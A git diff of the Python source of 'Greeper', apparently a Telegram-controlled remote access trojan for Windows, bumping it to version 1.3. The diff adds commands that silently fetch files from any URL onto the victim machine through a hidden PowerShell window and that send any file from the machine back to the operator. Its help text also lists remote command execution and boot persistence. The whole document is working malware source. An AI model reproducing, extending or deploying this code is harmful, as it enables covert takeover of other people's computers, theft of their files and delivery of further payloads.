@@ -1,4 +1,4 @@
-#GREEPER V1.2
+#GREEPER V1.3
 
 import os
 import sys
@@ -12,6 +12,56 @@ bot = telebot.TeleBot("YOUR_BOT_TOKEN")
 user = "YOUR_USER_ID"
 
 bot.send_message(user,"Greeper is online!\nSend /help for help")
+
+@bot.message_handler(commands=['upload'])
+def upload(msg):
+    if msg.from_user.id != int(user):
+        bot.send_message(msg.chat.id, "You don't have permission!")
+        return
+    try:
+        url = msg.text.partition(" ")[2]
+        if url == "":
+            bot.send_message(msg.chat.id, "Parameter required! Usage: /upload <URL> OR Send file to bot directly")
+            return
+        file_name = url.split("/")[-1]
+        file_path = os.path.join(os.getcwd(), file_name)
+        sp.Popen(['powershell', '-command', f"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'"], creationflags=sp.CREATE_NO_WINDOW)
+        bot.send_message(msg.chat.id, f"File Uploaded to client successfully: {file_name}")
+        bot.send_message(user, f"File saved to:\n{file_path}")
+    except Exception as e:
+        bot.send_message(msg.chat.id, f"Error uploading file: {str(e)}")  
+
+@bot.message_handler(content_types=['document','video','photo'])
+def upload_files(message):
+    if message.from_user.id != int(user):
+        bot.send_message(message.chat.id, "You don't have permission!")
+        return
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        fname=message.document.file_name
+        fpath=os.path.join(os.getcwd(), fname)
+        with open(fpath, 'wb') as file:
+            file.write(downloaded_file)
+        bot.send_message(message.chat.id, f"File saved successfully: {fname}")
+        bot.send_message(user, f"File saved to:\n{fpath}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error saving file: {str(e)}")
+
+@bot.message_handler(commands=['download'])
+def download(msg):
+    if msg.from_user.id != int(user):
+        bot.send_message(msg.chat.id, "You don't have permission!")
+        return
+    arguments = msg.text.split()
+    if len(arguments) > 1:
+        path = ' '.join(arguments[1:])
+        try:
+            bot.send_document(msg.chat.id, open(path, 'rb'))
+        except Exception as e:
+            bot.reply_to(msg, "Error while trying to download the file:\n" + str(e))
+    else:
+        bot.reply_to(msg, "Parameter required! Usage: download <path>")
 
 @bot.message_handler(commands=['persistent'])
 def persistent(msg):
@@ -135,10 +185,13 @@ Commands:
                  
 1. /cmd <command> - Execute cmd/ps commands
 2. /msg <message to display> - displays msg box
-3. /persistent - Auto starts Greeper on Boot!
-4. /uninstall - Uninstalls persistence
-5. /terminate - Terminate current session
-6. /help - Displays this message
+3. /upload <URL> - Uploads file from URL
+   You can also send file to bot directly
+4. /download <path> - Downloads file from client
+5. /persistent - Auto starts Greeper on Boot!
+6. /uninstall - Uninstalls persistence
+7. /terminate - Terminate current session
+8. /help - Displays this message
                  
 Replace <> with parameters
 Ex: /cmd dir
